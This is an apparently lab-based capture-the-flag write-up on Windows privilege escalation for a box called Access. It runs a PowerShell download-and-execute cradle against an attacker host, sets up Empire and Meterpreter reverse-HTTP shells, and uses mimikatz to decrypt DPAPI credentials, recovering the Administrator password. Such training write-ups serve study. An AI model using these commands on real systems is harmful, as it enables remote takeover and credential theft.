# Alternative way to exploit Access

## Privilege Escalation

After running the **Windows Enumeration Script**, it finds stored credentials for _Administrator_:
```markdown
cmdkey /list
```
```markdown
Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
```

We can get the plain-text password with **mimikatz**, instead of using the _runas_ way.

Setup in **Metasploit**:
```markdown
msf6 > handler -H 10.10.14.2 -P 9003 -p windows/meterpreter/reverse_http
```

Setup listener in **Empire** for box:
```markdown
(Empire) > uselistener http

(Empire: listeners/http) > set Host http://10.10.14.2:9004
(Empire: listeners/http) > set BindIP 10.10.14.2
(Empire: listeners/http) > set Port 9004

(Empire: listeners/http) > execute
```

Setup listener in **Empire** for **Metasploit**:
```markdown
(Empire) > uselistener meterpreter

(Empire: listeners/meterpreter) > set Host http://10.10.14.2/9003
(Empire: listeners/meterpreter) > set Port 9003
(Empire: listeners/meterpreter) > execute
```

Powershell launcher code to copy into a file _(empire.ps1)_:
```markdown
(Empire: listeners) > launcher powershell http
```

Executing _empire.ps1_ on box and the **Empire listener** starts:
```markdown
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/empire.ps1')
```

Interact with the listener to start a **meterpreter shell**:
```markdown
(Empire) > interact ADT7GYXR
(Empire: ADT7GYXR) > injectshellcode meterpreter
(Empire: powershell/code_execution/invoke_shellcode) > set Payload reverse_http
```

Now the **Meterpreter shell** started and **mimikatz** can be used in there:
```markdown
msf6 > sessions -i 1

meterpreter > migrate 1760
meterpreter > load kiwi
```

The following files and information are needed from the box:
```markdown
SID of user:
- S-1-5-21-953262931-566350628-63446256-1001

Key file:
- C:\users\security\appdata\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580

Credential:
- C:\users\security\appdata\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290
```

Getting masterkey with **mimikatz**:
```markdown
meterpreter > kiwi_cmd '"dpapi::masterkey /in:0792c32e-48a5-4fe3-8b43-d93d64590580 /sid:S-1-5-21-953262931-566350628-63446256-1001 /password:4Cc3ssC0ntr0ller"'
```

After getting the masterkey and the SHA1 hash, it is possible to get the password of _Administrator_:
```markdown
meterpreter > kiwi_cmd '"dpapi::cred /in:51AB168BE4BDB3A603DADE4F8CA81290"'
```
```markdown
(...)
CredentialBlob: 55Acc3ssS3cur1ty@megacorp
(...)
```

The password of _Administrator_ is:
> 55Acc3ssS3cur1ty@megacorp
